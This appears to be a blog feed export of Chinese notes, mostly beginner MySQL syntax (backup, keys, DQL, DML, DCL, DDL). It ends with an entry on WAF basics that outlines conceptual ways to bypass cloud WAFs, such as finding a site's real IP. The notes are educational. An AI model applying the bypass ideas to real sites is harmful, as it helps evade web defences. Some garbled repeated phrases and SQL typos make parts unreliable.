      <content type="html"><![CDATA[<h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><blockquote>
<p>不要登陆sql</p>
<p>不要打分号</p>
</blockquote>
<h2 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u用户名 -p密码 数据库名&gt;生成的脚本文件路径如（c:\a.sql）</span><br></pre></td></tr></table></figure>

<h2 id="还原"><a href="#还原" class="headerlink" title="还原"></a>还原</h2><ul>
<li>没登陆sql前</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u用户名 -p密码 数据库&lt;脚本文件路径如（c:\a.sql）</span><br></pre></td></tr></table></figure>

<ul>
<li>登陆sql</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source 脚本文件路径如（c:\a.sql）</span><br></pre></td></tr></table></figure>

]]></content>
      
        <categories>
            
            <category> 数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[数据库外键]]></title>
      <url>/2019/10/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%96%E9%94%AE/</url>
      <content type="html"><![CDATA[<h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><h2 id="外键"><a href="#外键" class="headerlink" title="外键"></a>外键</h2><p><code>外键必须是另一个表的主键值</code></p>
<ul>
<li>可以重复</li>
<li>可以为空</li>
<li>一张表可以有多个外键</li>
</ul>
<h2 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 表名(</span><br><span class="line">	列名 列类型,</span><br><span class="line">    列名 列类型,//外键名称和类型要和关联表的一样</span><br><span class="line">    <span class="keyword">CONSTRAINT</span> 约束名称 <span class="keyword">FOREIGN</span> <span class="keyword">KEY</span>(外键列名) <span class="keyword">REFERENCES</span> 关联表名(关联列名)</span><br><span class="line">);</span><br><span class="line">或</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> 约束名称 <span class="keyword">FOREIGN</span> <span class="keyword">KEY</span>(外键列名) <span class="keyword">REFERENCES</span> 关联表名(关联列名);</span><br></pre></td></tr></table></figure>

<h2 id="撤销约束"><a href="#撤销约束" class="headerlink" title="撤销约束"></a>撤销约束</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">DROP</span> <span class="keyword">FOREIGN</span> <span class="keyword">KEY</span> 约束名称;</span><br></pre></td></tr></table></figure>

<h2 id="删除外键"><a href="#删除外键" class="headerlink" title="删除外键"></a>删除外键</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">drop</span> 列名;</span><br></pre></td></tr></table></figure>

<h2 id="关系"><a href="#关系" class="headerlink" title="关系"></a>关系</h2><ul>
<li>一对多</li>
</ul>
<p>从表的外键是除主键外的列</p>
<ul>
<li>一对一</li>
</ul>
<p>从表的外键就是主键</p>
<ul>
<li>多对多</li>
</ul>
<p>创建一个中间表做为外键</p>
]]></content>
      
        <categories>
            
            <category> 数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[数据库主键]]></title>
      <url>/2019/10/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%BB%E9%94%AE/</url>
      <content type="html"><![CDATA[<h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><h2 id="主键"><a href="#主键" class="headerlink" title="主键"></a>主键</h2><ul>
<li>非空</li>
<li>唯一</li>
<li>被引用</li>
</ul>
<p><code>主键的列不能为空，不能有重复值出现</code></p>
<h2 id="创建主键"><a href="#创建主键" class="headerlink" title="创建主键"></a>创建主键</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 表名(</span><br><span class="line">	列名 列类型 PRIMARY <span class="keyword">KEY</span>,//主键</span><br><span class="line">    列名 列类型</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 表名(</span><br><span class="line">	列名 列类型，</span><br><span class="line">    列名 列类型，</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span>(列名)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h2 id="修改主键"><a href="#修改主键" class="headerlink" title="修改主键"></a>修改主键</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">ADD</span> PRIMARY <span class="keyword">KEY</span>(列名);</span><br></pre></td></tr></table></figure>

<h2 id="删除主键"><a href="#删除主键" class="headerlink" title="删除主键"></a>删除主键</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">DROP</span> PRIMARY <span class="keyword">KEY</span>;</span><br></pre></td></tr></table></figure>

<h2 id="自增长"><a href="#自增长" class="headerlink" title="自增长"></a>自增长</h2><p><code>通常为整型</code></p>
<ul>
<li>创建自增长主键</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 表名(</span><br><span class="line">	列名 <span class="built_in">INT</span> PRIMARY AUTO_INCREMENT,</span><br><span class="line">    列名 列类型</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<ul>
<li>修改自增长</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">CHANGE</span> 列名 列名 <span class="built_in">INT</span> AUTO_INCREMENT;</span><br></pre></td></tr></table></figure>

<ul>
<li>删除自增长</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">CHANGE</span> 列名 列名 <span class="built_in">INT</span>；</span><br></pre></td></tr></table></figure>

<h2 id="非空和唯一约束"><a href="#非空和唯一约束" class="headerlink" title="非空和唯一约束"></a>非空和唯一约束</h2><p><code>不是主键也可以设置</code></p>
<ul>
<li>非空</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 表名(</span><br><span class="line">	列名 列类型 <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    列名 列类型</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<ul>
<li>唯一</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 表名(</span><br><span class="line">	列名 列类型 <span class="keyword">UNIQUE</span>,</span><br><span class="line">    列名 列类型</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

]]></content>
      
        <categories>
            
            <category> 数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[数据库DQL]]></title>
      <url>/2019/09/30/%E6%95%B0%E6%8D%AE%E5%BA%93DQL/</url>
      <content type="html"><![CDATA[<h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><h2 id="DQL（数据查询语句）"><a href="#DQL（数据查询语句）" class="headerlink" title="DQL（数据查询语句）"></a>DQL（数据查询语句）</h2><h3 id="查询所有列"><a href="#查询所有列" class="headerlink" title="查询所有列"></a>查询所有列</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> 表名；</span><br></pre></td></tr></table></figure>

<h3 id="查询指定列"><a href="#查询指定列" class="headerlink" title="查询指定列"></a>查询指定列</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列<span class="number">1</span> [列<span class="number">2</span>, ... ,列n] <span class="keyword">FROM</span> 表名；</span><br></pre></td></tr></table></figure>

<h3 id="去重查询"><a href="#去重查询" class="headerlink" title="去重查询"></a>去重查询</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> * | 列<span class="number">1</span> [列<span class="number">2</span>, ... ,列n] <span class="keyword">FROM</span> 表名；</span><br></pre></td></tr></table></figure>

<h3 id="列运算"><a href="#列运算" class="headerlink" title="列运算"></a>列运算</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列名<span class="number">1</span>+列名<span class="number">2</span> <span class="keyword">FROM</span> 表名； // +、-、*、/，如果非法转发成整数都被当作<span class="number">0</span>运算，列名可以换成整数</span><br><span class="line"><span class="keyword">SELECT</span> IFUNLL(列名，<span class="number">0</span>) <span class="keyword">FROM</span> 表名；//转换<span class="literal">NULL</span>值为<span class="number">0</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(列名<span class="number">1</span>，列名<span class="number">2</span>) <span class="keyword">FROM</span> 表名；//mysql字符串连接要用<span class="keyword">CONCAT</span></span><br></pre></td></tr></table></figure>

<h3 id="别名"><a href="#别名" class="headerlink" title="别名"></a>别名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列名<span class="number">1</span> <span class="keyword">AS</span> 别名 <span class="keyword">FROM</span> 表名；//<span class="keyword">AS</span>可以省略</span><br></pre></td></tr></table></figure>

<h3 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> 表名 <span class="keyword">WHERE</span> 条件；</span><br></pre></td></tr></table></figure>

<h3 id="模糊查询"><a href="#模糊查询" class="headerlink" title="模糊查询"></a>模糊查询</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> 表名 <span class="keyword">WHERE</span> 列名 <span class="keyword">LIKE</span> 条件;// %标配0到N个字符，如%SQL匹配SQL结尾的，SQL%匹配SQL开头的，%SQL%匹配含有SQL的；_匹配一个字符。</span><br></pre></td></tr></table></figure>

<h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> 表名 <span class="keyword">ORDER</span> <span class="keyword">BY</span> 列名 <span class="keyword">ASC</span>;//升序</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> 表名 <span class="keyword">ORDER</span> <span class="keyword">BY</span> 列名 <span class="keyword">DESC</span>;//降序</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> 表名 <span class="keyword">ORDER</span> <span class="keyword">BY</span> 列名<span class="number">1</span> <span class="keyword">ASC</span>，列名<span class="number">2</span> <span class="keyword">DESC</span>[,列名<span class="number">3</span> 类型...];//多列查询</span><br></pre></td></tr></table></figure>

<h3 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h3><ul>
<li>COUNT</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*) <span class="keyword">FROM</span> 表名；//记录不为<span class="literal">null</span>的行数的总和</span><br></pre></td></tr></table></figure>

<ul>
<li>MAX</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">MAX</span>(列名) <span class="keyword">FROM</span> 表名；//查询最大值</span><br></pre></td></tr></table></figure>

<ul>
<li>MIN</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">MIN</span>(列名) <span class="keyword">FROM</span> 表名；//查询最小值</span><br></pre></td></tr></table></figure>

<ul>
<li>SUM</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">SUM</span>(列名) <span class="keyword">FROM</span> 表名；//求和</span><br></pre></td></tr></table></figure>

<ul>
<li>AVG</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">AVG</span>(列名) <span class="keyword">FROM</span> 表名；//平均值</span><br></pre></td></tr></table></figure>

<h3 id="分组查询"><a href="#分组查询" class="headerlink" title="分组查询"></a>分组查询</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列名,聚合函数 <span class="keyword">FROM</span> 表名 <span class="keyword">GROUP</span> <span class="keyword">BY</span> 列名；</span><br></pre></td></tr></table></figure>

<h3 id="LIMIT"><a href="#LIMIT" class="headerlink" title="LIMIT"></a>LIMIT</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> 表名 <span class="keyword">LIMIT</span> n,m;//从n+1行开始，查询m条</span><br></pre></td></tr></table></figure>

]]></content>
      
        <categories>
            
            <category> 数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[数据库DML]]></title>
      <url>/2019/09/30/%E6%95%B0%E6%8D%AE%E5%BA%93DML/</url>
      <content type="html"><![CDATA[<h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><h2 id="DML（数据操作语言）"><a href="#DML（数据操作语言）" class="headerlink" title="DML（数据操作语言）"></a>DML（数据操作语言）</h2><p><strong>在数据库中所有字符串必须使用单引</strong></p>
<h3 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名(列名<span class="number">1</span>,列名<span class="number">2</span>,...) <span class="keyword">VALUES</span>(列值<span class="number">1</span>,列值<span class="number">2</span>,..);//完整插入</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名(列名<span class="number">1</span>，列名<span class="number">3</span>) <span class="keyword">VALUES</span>(列值<span class="number">1</span>，列值<span class="number">3</span>)；//部分列插入，列值<span class="number">2</span>填充<span class="literal">null</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名 <span class="keyword">VALUES</span>(列值<span class="number">1</span>,列值<span class="number">2</span>,..)//按表的结构插入所有列</span><br></pre></td></tr></table></figure>

<p><code>插入总是是完整的一行，VALUES的值要与列名对应</code></p>
<h3 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> 表名 <span class="keyword">SET</span> 列名<span class="number">1</span>=列值<span class="number">1</span>,列名<span class="number">2</span>=列值<span class="number">2</span>,...[<span class="keyword">WHERE</span> 条件];</span><br></pre></td></tr></table></figure>

<h3 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> 表名 [<span class="keyword">WHERE</span> 条件];</span><br></pre></td></tr></table></figure>

<p><code>必须加WHERE不然全部都删除</code></p>
]]></content>
      
        <categories>
            
            <category> 数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[数据库DCL]]></title>
      <url>/2019/09/30/%E6%95%B0%E6%8D%AE%E5%BA%93DCL/</url>
      <content type="html"><![CDATA[<h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><h2 id="DCL（数据控制语言）"><a href="#DCL（数据控制语言）" class="headerlink" title="DCL（数据控制语言）"></a>DCL（数据控制语言）</h2><h3 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> 用户名@IP地址 <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> ’密码‘;</span><br></pre></td></tr></table></figure>

<p><code>用户名@’%‘  可以任意IP地址登陆</code></p>
<h3 id="给用户授权"><a href="#给用户授权" class="headerlink" title="给用户授权"></a>给用户授权</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> 权限<span class="number">1</span>,权限<span class="number">2</span>,...，权限n <span class="keyword">ON</span> 数据库.* <span class="keyword">TO</span> 用户名@IP地址；</span><br></pre></td></tr></table></figure>

<p><code>*代表全部表</code></p>
<h3 id="撤销权限"><a href="#撤销权限" class="headerlink" title="撤销权限"></a>撤销权限</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">REVOKE</span> 权限<span class="number">1</span>,权限<span class="number">2</span>,...，权限n <span class="keyword">ON</span> 数据库.* <span class="keyword">FROM</span> 用户名@IP地址；</span><br></pre></td></tr></table></figure>

<p><code>*代表全部表</code></p>
<h3 id="查看权限"><a href="#查看权限" class="headerlink" title="查看权限"></a>查看权限</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">GRANTS</span> <span class="keyword">FOR</span> 用户名@IP地址；</span><br></pre></td></tr></table></figure>

<h3 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">USER</span> 用户名@IP地址；</span><br></pre></td></tr></table></figure>

]]></content>
      
        <categories>
            
            <category> 数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[数据库DDL]]></title>
      <url>/2019/09/30/%E6%95%B0%E6%8D%AE%E5%BA%93DDL/</url>
      <content type="html"><![CDATA[<h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><h2 id="DDL-数据定义语言"><a href="#DDL-数据定义语言" class="headerlink" title="DDL(数据定义语言)"></a>DDL(数据定义语言)</h2><h3 id="库"><a href="#库" class="headerlink" title="库"></a>库</h3><ul>
<li>查看数据库</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>切换数据库</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> 数据库名;</span><br></pre></td></tr></table></figure>

<ul>
<li>创建数据库</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> [<span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>] 数据库名 [<span class="keyword">CHARSET</span>=utf8];</span><br></pre></td></tr></table></figure>

<ul>
<li>删除数据库</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> [<span class="keyword">IF</span> <span class="keyword">EXISTS</span>] 数据库名;</span><br></pre></td></tr></table></figure>

<ul>
<li>修改数据库编码</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">DATABASE</span> 数据库名 <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8;</span><br></pre></td></tr></table></figure>

<h3 id="表"><a href="#表" class="headerlink" title="表"></a>表</h3><ul>
<li>查看表</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>创建表</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> [<span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>] 表名（</span><br><span class="line">	列名 列类型,</span><br><span class="line">	列名 列类型,</span><br><span class="line">	...</span><br><span class="line">	列名 列类型,</span><br><span class="line">）；</span><br></pre></td></tr></table></figure>

<ul>
<li>删除表</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> 表名;</span><br></pre></td></tr></table></figure>

<ul>
<li>查看表结构</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DESC 表名；</span><br></pre></td></tr></table></figure>

<ul>
<li>添加表</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">ADD</span>(</span><br><span class="line">	列名 列类型,</span><br><span class="line">	列名 列类型,</span><br><span class="line">	...</span><br><span class="line">	列名 列类型,</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<ul>
<li>修改列类型</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">MODIFY</span> 列名 列类型；</span><br></pre></td></tr></table></figure>

<ul>
<li>删除列</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">DROP</span> 列名；</span><br></pre></td></tr></table></figure>

<ul>
<li>修改表名称</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">RENAME</span> <span class="keyword">TO</span> 新表名；</span><br></pre></td></tr></table></figure>

]]></content>
      
        <categories>
            
            <category> 数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SQL注入之WAF基础]]></title>
      <url>/2019/08/25/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BWAF%E5%9F%BA%E7%A1%80/</url>
      <content type="html"><![CDATA[<h1 id="WAF简介"><a href="#WAF简介" class="headerlink" title="WAF简介"></a>WAF简介</h1><p>在过去网站发展不是很流行的时候，传统的网络防火墙往往就是成为了企业或者公司的安全防线。但这传统防火墙只是架构网络体系在第三层中的网络层当中，只能有限地阻止和截获一些网络层的数据包。而随着web服务应用的不断发展，攻击者开始懂得针对性的盯上web应用层服务进行攻击。而传统的防火墙往往只能截获网络层数据包，对于应用层当中的数据包往往就无能为力，这时WAF就应用开始应运而生。</p>
<p>全称Web应用防火墙，是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提高保护的一款产品。WAF往往是基础规则防护的设备，WAF通常包含着各种各样防护应用的安全规则，WAF生产商往往根据这个制定好的规则库并定期跟新。用户使用这个WAF规则就可以对自己网站进行有效的保护</p>
<p>所以我们就可以简单理解为：WAF就是一款Web应用的安全产品，通过内置安全规则匹配来保护Web网站应用。</p>
<h1 id="WAF分类"><a href="#WAF分类" class="headerlink" title="WAF分类"></a>WAF分类</h1><h2 id="云waf"><a href="#云waf" class="headerlink" title="云waf"></a>云waf</h2><p>简单而言，就是将WAF架构部署在云端，外量流量连接都需要经过云 架构部署在云端，外量流量连接都需要经过云waf过滤检测，之后再将过滤检测后 过滤检测，之后再将过滤检测后 数据包发给网站服务器。 数据包发给网站</p>
<h2 id="硬件waf"><a href="#硬件waf" class="headerlink" title="硬件waf"></a>硬件waf</h2><p>一般这类waf往往架构在服务器前端，充当硬件设备来保护网站。</p>
<h2 id="软件waf"><a href="#软件waf" class="headerlink" title="软件waf"></a>软件waf</h2><p>而软件waf往往就是我们常常听说的安全狗之类的产品，我们可以将它直接下载下来，部署在服务器当中。软件<br>往往就是我们常常听说的安全狗之类的产品，我们可以将它直接下载下来，部署在服务器当中。软件waf往往就只是通过规则匹配<br>往往就只是通过规则匹配 进行的。而我们常常说的过狗，往往就是只是在规则层面进行绕过和利用。（规则层面后面会讲）。</p>
<h1 id="WAF防护规则"><a href="#WAF防护规则" class="headerlink" title="WAF防护规则"></a>WAF防护规则</h1><h2 id="架构层层面"><a href="#架构层层面" class="headerlink" title="架构层层面"></a>架构层层面</h2><p>架构层层面一般是针对的是云WAF，大多数云WAF架构在云端，例如百度云加速、360安全卫士等，通过更改DNS解析，把流量引入WAF集群，流量经过检测后转发请求到源站。简单的说对于此类WAF架构层层面。</p>
<h2 id="寻找网站的真实地址"><a href="#寻找网站的真实地址" class="headerlink" title="寻找网站的真实地址"></a>寻找网站的真实地址</h2><p>因为云WAF部署在云端，外部流量经过它的解析在传递给网站服务器。这时我们如果能够找到网站的真实地址，不通过域名进行访问，直接用网站IP地址访问，这样外部流量不经过云WAF进行DNS解析，从而绕过了WAF的实现。</p>
<h2 id="寻找当前网站的相同网段"><a href="#寻找当前网站的相同网段" class="headerlink" title="寻找当前网站的相同网段"></a>寻找当前网站的相同网段</h2><p>这种绕过方式可以归结于云网络运营商部署问题。有些云网站运营商会把他们的同一网段的网站都只用一个云WAF进行过滤解析，你可以寻找它同一网段下的网站 找它同一网段下的网站ip地址，从而从网段内部对不同网站之间进行访问。</p>
<h2 id="利用网站的边界漏洞"><a href="#利用网站的边界漏洞" class="headerlink" title="利用网站的边界漏洞"></a>利用网站的边界漏洞</h2><p>边界漏洞这里主要是指利用一些xss或者csrf的漏洞进行到攻击内部。云WAF的机制规则没能覆盖到网站边界。</p>
